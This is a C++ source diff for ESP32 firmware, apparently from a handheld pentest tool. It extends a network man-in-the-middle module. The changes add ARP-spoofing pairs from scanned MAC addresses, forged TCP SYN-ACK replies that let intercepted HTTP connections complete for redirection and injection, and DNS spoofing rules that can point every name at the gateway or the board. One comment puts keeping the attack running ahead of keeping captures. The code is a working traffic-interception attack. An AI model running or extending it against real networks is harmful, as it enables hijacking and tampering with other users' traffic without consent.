@@ -28,11 +28,13 @@
 
 #include "core/wifi/wifi_common.h"
 #include "modules/wifi/wifi_atks.h"
+#include <esp_heap_caps.h>
 #include <globals.h>
 
 #include <WiFi.h>
 #include <esp_netif.h>
 #include <esp_netif_net_stack.h>
+#include <esp_system.h>
 #include <esp_private/wifi.h>
 #include <esp_wifi.h>
 #include <lwip/etharp.h>
@@ -51,7 +53,7 @@
 /// One queued frame handed from the layer-2 hook to the service task.
 struct NetSpoofSlot {
     volatile uint8_t state; // 0 free, 1 filling, 2 ready
-    uint8_t kind;           // 0 = DNS query, 1 = HTTP request
+    uint8_t kind;           // 0 = DNS query, 1 = HTTP request, 2 = TCP SYN
     uint8_t clientMac[6];
     uint8_t _pad;
     uint32_t srcIp;         // wire order, as seen in the frame
@@ -97,7 +99,21 @@ static uint32_t s_httpRequests = 0;
 static uint32_t s_httpRedirected = 0;
 static uint32_t s_httpInjected = 0;
 
-static NetSpoofCapture s_captures[NETSPOOF_MAX_CAPTURES];
+// The capture ring is scratch data (the last eight intercepted frames) and used
+// to sit in .bss: eight entries of ~530 B = 4.2 KB of INTERNAL DRAM for the
+// whole boot, which is the memory the Wi-Fi/BLE bring-up and the MITM page
+// itself have to fit into. Allocate it from PSRAM on first use instead; the
+// internal heap is only the fallback. Called from the service task, never from
+// the layer-2 hook, so a one-time heap call is safe here.
+static NetSpoofCapture *s_captureRing = nullptr;
+static NetSpoofCapture *s_captures() {
+    if (s_captureRing == nullptr) {
+        size_t bytes = sizeof(NetSpoofCapture) * NETSPOOF_MAX_CAPTURES;
+        s_captureRing = (NetSpoofCapture *)heap_caps_malloc(bytes, MALLOC_CAP_SPIRAM);
+        if (s_captureRing == nullptr) s_captureRing = (NetSpoofCapture *)heap_caps_malloc(bytes, MALLOC_CAP_8BIT);
+    }
+    return s_captureRing;
+}
 static int s_captureCount = 0; // valid entries, newest at index 0
 
 static NetSpoofSlot s_slots[NETSPOOF_QUEUE_DEPTH];
@@ -520,38 +536,33 @@ static void _restorePair(const NetSpoofPair &p) {
     }
 }
 
-bool netspoof_arp_start(const IPAddress &target, const IPAddress &gateway, String &err) {
-    if (!netspoof_wifi_ready(err)) return false;
-    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
+/// The default gateway: the caller's address when given, otherwise DHCP's.
+static bool _defaultGw(const IPAddress &requested, IPAddress &gw, String &err) {
+    gw = requested;
+    if ((uint32_t)gw != 0) return true;
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    esp_netif_ip_info_t info;
+    if (!sta || esp_netif_get_ip_info(sta, &info) != ESP_OK || info.gw.addr == 0) {
+        err = "could not determine the default gateway";
+        return false;
+    }
+    gw = IPAddress(info.gw.addr);
+    return true;
+}
 
-    IPAddress gw = gateway;
-    if ((uint32_t)gw == 0) {
-        esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
-        esp_netif_ip_info_t info;
-        if (!sta || esp_netif_get_ip_info(sta, &info) != ESP_OK || info.gw.addr == 0) {
-            err = "could not determine the default gateway";
-            return false;
-        }
-        gw = IPAddress(info.gw.addr);
-    }
-    if ((uint32_t)target == 0) {
-        err = "targetIP is required";
-        return false;
-    }
-    if (target == gw) {
-        err = "targetIP must not be the gateway";
-        return false;
-    }
-
-    uint8_t tMac[6] = {0}, gMac[6] = {0};
-    if (!netspoof_resolve_mac(target, tMac, 2000)) {
-        err = "target did not answer ARP (wrong subnet or host down)";
-        return false;
-    }
-    if (!netspoof_gateway_info(gw, gMac)) {
-        err = "could not resolve the gateway MAC (gateway not in the ARP table)";
-        return false;
-    }
+/**
+ * @brief Add (or refresh) one pair once both MAC addresses are known.
+ *
+ * Split out so a host discovered by an ARP scan can be paired from the MAC the
+ * scan already saw. Re-resolving the address is what made "All devices" fail:
+ * a dozing phone answers the scan's broadcast request but ignores the unicast
+ * resolve that follows (measured on a 2026-10-21 phone), so the pair was
+ * refused with "target did not answer ARP" while the scan listed it a second
+ * earlier.
+ */
+static bool _pairAdd(
+    const IPAddress &target, const uint8_t tMac[6], const IPAddress &gw, const uint8_t gMac[6], String &err
+) {
     if (_sameMac(tMac, gMac) || _sameMac(tMac, s_myMac)) {
         err = "target resolves to the gateway/our own MAC";
         return false;
@@ -595,6 +606,71 @@ bool netspoof_arp_start(const IPAddress &target, const IPAddress &gateway, Strin
         _macStr(gMac).c_str()
     );
     return true;
+}
+
+bool netspoof_arp_start(const IPAddress &target, const IPAddress &gateway, String &err) {
+    if (!netspoof_wifi_ready(err)) return false;
+    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
+
+    IPAddress gw;
+    if (!_defaultGw(gateway, gw, err)) return false;
+    if ((uint32_t)target == 0) {
+        err = "targetIP is required";
+        return false;
+    }
+    if (target == gw) {
+        err = "targetIP must not be the gateway";
+        return false;
+    }
+
+    uint8_t tMac[6] = {0}, gMac[6] = {0};
+    if (!netspoof_resolve_mac(target, tMac, 2000)) {
+        err = "target did not answer ARP (wrong subnet or host down)";
+        return false;
+    }
+    if (!netspoof_gateway_info(gw, gMac)) {
+        err = "could not resolve the gateway MAC (gateway not in the ARP table)";
+        return false;
+    }
+    return _pairAdd(target, tMac, gw, gMac, err);
+}
+
+bool netspoof_arp_start_mac(
+    const IPAddress &target, const uint8_t targetMac[6], const IPAddress &gateway, String &err
+) {
+    if (!netspoof_wifi_ready(err)) return false;
+    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
+
+    if ((uint32_t)target == 0) {
+        err = "targetIP is required";
+        return false;
+    }
+    if (targetMac == nullptr) {
+        err = "targetMAC is required";
+        return false;
+    }
+    uint8_t tMac[6];
+    memcpy(tMac, targetMac, 6);
+    bool allZero = true;
+    for (int i = 0; i < 6; i++) if (tMac[i] != 0) allZero = false;
+    if (allZero) {
+        err = "targetMAC is empty";
+        return false;
+    }
+
+    IPAddress gw;
+    if (!_defaultGw(gateway, gw, err)) return false;
+    if (target == gw) {
+        err = "targetIP must not be the gateway";
+        return false;
+    }
+
+    uint8_t gMac[6] = {0};
+    if (!netspoof_gateway_info(gw, gMac)) {
+        err = "could not resolve the gateway MAC (gateway not in the ARP table)";
+        return false;
+    }
+    return _pairAdd(target, tMac, gw, gMac, err);
 }
 
 void netspoof_arp_restore_all() {
@@ -831,13 +907,22 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         flags = l4[13];
         payload = l4 + dataOff;
         payloadLen = (uint16_t)(total - 14 - ihl - dataOff);
-        if (payloadLen < 8) return next ? next(p, inp) : ERR_OK;
-        kind = 1;
+        // A bare SYN opens the connection: answer it so a GET can follow (see
+        // _handleSyn()). Without this the client never gets a handshake and the
+        // interception path is unreachable on a real network.
+        if (payloadLen == 0 && (flags & 0x02) && !(flags & 0x10)) {
+            kind = 2;
+        } else {
+            if (payloadLen < 8) return next ? next(p, inp) : ERR_OK;
+            kind = 1;
+        }
     }
-    if (!payloadLen) return next ? next(p, inp) : ERR_OK;
+    if (!payloadLen && kind != 2) return next ? next(p, inp) : ERR_OK;
 
     // Cheap filter so the slot pool is not wasted on unrelated traffic.
-    if (kind == 0) {
+    if (kind == 2) {
+        // nothing to parse: the SYN is answered from its headers
+    } else if (kind == 0) {
         uint16_t txid;
         char name[80];
         uint16_t qtype, qclass;
@@ -991,7 +1076,7 @@ static bool _txTcpRaw(
     _put16(tcp + 14, 64240);
     _put16(tcp + 16, 0);
     _put16(tcp + 18, 0);
-    memcpy(tcp + 20, payload, payloadLen);
+    if (payloadLen) memcpy(tcp + 20, payload, payloadLen);
 
     uint32_t acc = _sum16((const uint8_t *)&srcIp, 4, 0);
     acc = _sum16((const uint8_t *)&dstIp, 4, acc);
@@ -1005,9 +1090,14 @@ static bool _txTcpRaw(
 
 static void _capturePush(const NetSpoofSlot *slot, const char *method, const char *host, const char *path, uint8_t action) {
     _lock();
+    NetSpoofCapture *ring = s_captures();
+    if (ring == nullptr) { // no 4 KB anywhere: lose the capture, not the attack
+        _unlock();
+        return;
+    }
     if (s_captureCount == NETSPOOF_MAX_CAPTURES) s_captureCount = NETSPOOF_MAX_CAPTURES - 1;
-    for (int i = s_captureCount; i > 0; i--) s_captures[i] = s_captures[i - 1];
-    NetSpoofCapture &c = s_captures[0];
+    for (int i = s_captureCount; i > 0; i--) ring[i] = ring[i - 1];
+    NetSpoofCapture &c = ring[0];
     memset(&c, 0, sizeof(c));
     c.ts = millis();
     c.kind = slot->kind;
@@ -1053,19 +1143,49 @@ static bool _dnsRuleMatch(const NetSpoofRule &r, const String &name) {
     return false;
 }
 
+/// True when @p value is one of the symbolic DNS answers rather than an IPv4.
+static bool _dnsValueIsToken(const String &value) {
+    String v = value;
+    v.trim();
+    return v.equalsIgnoreCase("gateway") || v.equalsIgnoreCase("gw") || v.equalsIgnoreCase("this") ||
+           v.equalsIgnoreCase("board");
+}
+
+///
+/// Resolve a rule value: an IPv4 literal, `gateway` (this network's router) or
+/// `this` (the board's station address).
+///
+/// The tokens are resolved per query, not when the rule is added, so a payload
+/// can be loaded while the station is down and still answer correctly once it
+/// joins - `dns * gateway` is the usual payload line and the gateway does not
+/// exist yet at load time.
+static bool _dnsValueIp(const String &value, IPAddress &ip) {
+    String v = value;
+    v.trim();
+    if (v.equalsIgnoreCase("gateway") || v.equalsIgnoreCase("gw")) {
+        uint8_t mac[6];
+        return netspoof_gateway_info(ip, mac);
+    }
+    if (v.equalsIgnoreCase("this") || v.equalsIgnoreCase("board")) {
+        if (!WiFi.isConnected()) return false;
+        ip = WiFi.localIP();
+        return true;
+    }
+    return ip.fromString(v.c_str());
+}
+
 bool netspoof_dns_lookup(const String &name, IPAddress &ip) {
     _ensure_mutex();
     _lock();
-    bool hit = false;
-    for (int i = 0; i < s_dnsRuleCount && !hit; i++) {
-        if (_dnsRuleMatch(s_dnsRules[i], name)) {
-            ip.fromString(s_dnsRules[i].value.c_str());
-            s_dnsRules[i].hits++;
-            hit = true;
-        }
+    int hit = -1;
+    for (int i = 0; i < s_dnsRuleCount && hit < 0; i++) {
+        if (_dnsRuleMatch(s_dnsRules[i], name)) hit = i;
     }
+    String value = hit >= 0 ? s_dnsRules[hit].value : String();
+    if (hit >= 0) s_dnsRules[hit].hits++;
     _unlock();
-    return hit;
+    if (hit < 0) return false;
+    return _dnsValueIp(value, ip);
 }
 
 /// Handle one queued DNS query: match a rule and answer it.
@@ -1208,6 +1328,28 @@ static size_t _buildHttpResponse(
     return total;
 }
 
+///
+/// Answer the client's SYN with a forged SYN-ACK.
+///
+/// Without this the engine can never see a request: the destination is a host
+/// on the internet (or the gateway), so its own stack is the only thing that
+/// would answer the handshake - and the L2 hook swallows the SYN instead of
+/// forwarding it (the ESP cannot route). The GET only exists after a handshake
+/// succeeded, so the board has to complete that handshake itself. Answering the
+/// SYN is enough: the client's next segment carries `ack = our ISN + 1`, and
+/// `_handleHttp()` already uses the client's ack as the sequence of its forged
+/// response, so no connection table is needed here.
+static void _handleSyn(NetSpoofSlot *slot) {
+    static uint32_t s_isn = 0;
+    if (!(slot->flags & 0x02)) return; // SYN
+    if (!s_isn) s_isn = esp_random() | 1;
+    s_isn += 0x00010000; // a new initial sequence number per connection
+    _txTcpRaw(
+        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, s_isn, slot->seq + 1, 0x12,
+        NULL, 0
+    );
+}
+
 /// Handle one queued HTTP request: match a rule and answer it.
 static void _handleHttp(NetSpoofSlot *slot) {
     s_httpRequests++;
@@ -1296,6 +1438,8 @@ static void _svcLoop(void *arg) {
         if (slot) {
             if (slot->kind == 0) {
                 if (s_dnsActive) _handleDns(slot);
+            } else if (slot->kind == 2) {
+                if (s_httpActive) _handleSyn(slot);
             } else {
                 if (s_httpActive) _handleHttp(slot);
             }
@@ -1345,10 +1489,14 @@ uint32_t netspoof_dns_answers() { return s_dnsAnswers; }
 
 bool netspoof_dns_add_rule(const String &domain, const String &ip, bool wildcard, String &err) {
     IPAddress parsed;
-    if (!parsed.fromString(ip.c_str())) {
+    String value = ip;
+    value.trim();
+    bool token = _dnsValueIsToken(value);
+    if (!token && !parsed.fromString(value.c_str())) {
         err = "invalid IPv4 address: " + ip;
         return false;
     }
+    if (token) value.toLowerCase();
     if (wildcard && domain.length() == 0) {
         // ok: startAll('*', ip)
     } else if (domain.length() == 0) {
@@ -1366,7 +1514,7 @@ bool netspoof_dns_add_rule(const String &domain, const String &ip, bool wildcard
     // Replace an existing rule for the same pattern.
     for (int i = 0; i < s_dnsRuleCount; i++) {
         if (s_dnsRules[i].match.equalsIgnoreCase(domain)) {
-            s_dnsRules[i].value = ip;
+            s_dnsRules[i].value = token ? value : parsed.toString();
             s_dnsRules[i].wildcard = wildcard;
             _unlock();
             return true;
@@ -1375,7 +1523,7 @@ bool netspoof_dns_add_rule(const String &domain, const String &ip, bool wildcard
     NetSpoofRule &r = s_dnsRules[s_dnsRuleCount++];
     r.match = domain;
     r.match.toLowerCase();
-    r.value = ip;
+    r.value = token ? value : parsed.toString();
     r.wildcard = wildcard;
     r.hits = 0;
     _unlock();
@@ -1478,6 +1626,20 @@ void netspoof_http_clear_rules() {
     _unlock();
 }
 
+void netspoof_http_clear_injections() {
+    _ensure_mutex();
+    _lock();
+    s_injectCount = 0;
+    _unlock();
+}
+
+void netspoof_http_clear_redirects() {
+    _ensure_mutex();
+    _lock();
+    s_redirCount = 0;
+    _unlock();
+}
+
 int netspoof_http_redirect_count() {
     _lock();
     int n = s_redirCount;
@@ -1527,8 +1689,9 @@ bool netspoof_http_stop(String &err) {
 int netspoof_capture_count() { return s_captureCount; }
 
 const NetSpoofCapture *netspoof_capture(int idx) {
-    if (idx < 0 || idx >= s_captureCount) return NULL;
-    return &s_captures[idx];
+    NetSpoofCapture *ring = s_captures();
+    if (idx < 0 || idx >= s_captureCount || ring == nullptr) return NULL;
+    return &ring[idx];
 }
 
 void netspoof_capture_clear() { s_captureCount = 0; }
